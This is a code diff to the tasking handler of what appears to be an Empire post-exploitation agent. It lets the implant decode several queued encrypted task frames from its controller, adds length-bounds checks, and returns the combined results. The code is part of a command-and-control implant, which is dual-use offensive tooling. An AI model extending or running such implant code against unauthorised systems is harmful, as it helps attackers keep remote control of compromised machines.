@@ -359,9 +359,51 @@ AESc = AES encrypted using the client's session key
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
             byte[] taskingBytes = EmpireStager.AesDecryptAndVerify(sessionInfo.GetSessionKeyBytes(), encryptedTask);
-            PACKET firstPacket = DecodePacket(taskingBytes, 0);
-            byte[] resultPackets = ProcessTasking(firstPacket);
-            SendMessage(resultPackets);
+
+            // The server concatenates queued tasks into one encrypted blob;
+            // each inner frame is a 12-byte header plus payload.
+            const int HEADER_SIZE = 12;
+            int offset = 0;
+            byte[] resultPackets = Array.Empty<byte>();
+            while (offset < taskingBytes.Length)
+            {
+                if (taskingBytes.Length - offset < HEADER_SIZE)
+                {
+                    resultPackets = Misc.combine(resultPackets, EncodePacket(0, "[!] tasking decode failed: trailing bytes shorter than frame header", 0));
+                    break;
+                }
+                long advance;
+                PACKET packet;
+                try
+                {
+                    packet = DecodePacket(taskingBytes, offset);
+                    // packet.length is uint32 from the wire; cast via long so a
+                    // hostile value can't sign-extend negative and walk offset
+                    // backwards into an infinite re-decode loop.
+                    advance = HEADER_SIZE + (long)packet.length;
+                    if (packet.length > int.MaxValue || offset + advance > taskingBytes.Length)
+                    {
+                        resultPackets = Misc.combine(resultPackets, EncodePacket(0, "[!] tasking decode failed: frame length out of range", packet.taskId));
+                        break;
+                    }
+                    byte[] packetResult = ProcessTasking(packet);
+                    if (packetResult != null && packetResult.Length > 0)
+                    {
+                        resultPackets = Misc.combine(resultPackets, packetResult);
+                    }
+                }
+                catch (Exception error)
+                {
+                    resultPackets = Misc.combine(resultPackets, EncodePacket(0, "[!] tasking decode failed: " + error.Message, 0));
+                    break;
+                }
+                offset += (int)advance;
+            }
+
+            if (resultPackets.Length > 0)
+            {
+                SendMessage(resultPackets);
+            }
         }
 
         private byte[] ProcessTasking(PACKET packet)
